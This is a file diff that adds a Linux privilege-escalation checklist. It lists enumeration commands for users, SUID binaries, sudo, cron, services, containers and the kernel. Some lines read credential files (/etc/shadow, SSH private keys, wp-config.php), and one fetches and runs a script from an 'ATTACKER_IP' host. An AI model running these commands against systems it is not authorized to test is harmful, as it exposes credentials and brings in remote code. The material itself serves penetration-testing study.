@@ -1,0 +1,276 @@
+====================================================
+LINUX PRIVILEGE ESCALATION CHECKLIST
+====================================================
+
+############################
+# 1. BASIC ENUMERATION
+############################
+
+whoami
+id
+hostname
+uname -a
+cat /etc/os-release
+cat /proc/version
+pwd
+env
+history
+last
+w
+who
+groups
+
+############################
+# 2. USER ENUMERATION
+############################
+
+cat /etc/passwd
+cat /etc/shadow
+getent passwd
+getent group
+sudo -l
+
+find / -user root -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+############################
+# 3. FILE PERMISSIONS
+############################
+
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+find / -perm -o+w 2>/dev/null
+find / -perm -g+w 2>/dev/null
+
+ls -la /tmp
+ls -la /var/tmp
+ls -la /dev/shm
+
+############################
+# 4. SUDO
+############################
+
+sudo -l
+sudo -V
+
+Check:
+- NOPASSWD
+- Allowed binaries
+- Wildcards
+- Environment variables
+
+Reference:
+GTFOBins
+
+############################
+# 5. SUID BINARIES
+############################
+
+find / -perm -4000 -type f 2>/dev/null
+
+Check every binary on GTFOBins.
+
+############################
+# 6. CAPABILITIES
+############################
+
+getcap -r / 2>/dev/null
+
+############################
+# 7. CRON JOBS
+############################
+
+crontab -l
+cat /etc/crontab
+ls -la /etc/cron*
+systemctl list-timers
+
+Look for:
+- Writable scripts
+- PATH hijacking
+- Missing absolute paths
+
+############################
+# 8. SERVICES
+############################
+
+systemctl list-units --type=service
+service --status-all
+
+Check:
+- Writable service files
+- Weak service permissions
+
+############################
+# 9. RUNNING PROCESSES
+############################
+
+ps aux
+ps -ef
+top
+
+Look for:
+- Root processes
+- Custom binaries
+- Credentials in arguments
+
+############################
+# 10. NETWORK
+############################
+
+ss -tulpn
+netstat -tulpn
+ip addr
+ip route
+arp -a
+
+############################
+# 11. MOUNTS
+############################
+
+mount
+df -h
+cat /etc/fstab
+
+Check:
+- NFS
+- Writable mounts
+- noexec/nosuid
+
+############################
+# 12. PASSWORDS
+############################
+
+grep -Ri "password" /home 2>/dev/null
+grep -Ri "password" /var/www 2>/dev/null
+
+find / -name "*.bak" 2>/dev/null
+find / -name "*.old" 2>/dev/null
+find / -name "*.conf" 2>/dev/null
+find / -name "*.ini" 2>/dev/null
+
+############################
+# 13. SSH
+############################
+
+ls -la ~/.ssh
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+
+find / -name "id_rsa*" 2>/dev/null
+
+############################
+# 14. WEB ROOT
+############################
+
+find / -name config.php 2>/dev/null
+find / -name wp-config.php 2>/dev/null
+find / -name database.yml 2>/dev/null
+
+############################
+# 15. DOCKER / CONTAINERS
+############################
+
+docker ps
+docker images
+groups
+
+id
+
+Check:
+- docker group membership
+- Mounted docker.sock
+
+############################
+# 16. NFS
+############################
+
+mount
+showmount -e localhost
+
+############################
+# 17. KERNEL
+############################
+
+uname -a
+cat /proc/version
+
+Search:
+searchsploit Linux <kernel-version>
+
+############################
+# 18. PATH HIJACKING
+############################
+
+echo $PATH
+
+Check:
+- Writable PATH directories
+- Relative command execution
+
+############################
+# 19. ENVIRONMENT VARIABLES
+############################
+
+env
+printenv
+
+############################
+# 20. INSTALLED SOFTWARE
+############################
+
+dpkg -l
+rpm -qa
+
+Check versions:
+searchsploit
+
+############################
+# 21. LOG FILES
+############################
+
+find /var/log -type f 2>/dev/null
+
+Look for:
+- Credentials
+- Tokens
+- Errors
+
+############################
+# 22. LINPEAS
+############################
+
+wget http://ATTACKER_IP/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+############################
+# 23. GTFOBINS
+############################
+
+Check:
+https://gtfobins.github.io/
+
+############################
+# 24. QUICK WIN CHECKLIST
+############################
+
+[ ] sudo -l
+[ ] SUID binaries
+[ ] Capabilities
+[ ] Writable files
+[ ] Writable directories
+[ ] Cron jobs
+[ ] Running services
+[ ] PATH hijacking
+[ ] Password files
+[ ] SSH keys
+[ ] Docker group
+[ ] NFS
+[ ] Kernel exploits
+[ ] Config files
+[ ] Backups
+[ ] Environment variables
+[ ] LinPEAS
+[ ] GTFOBins
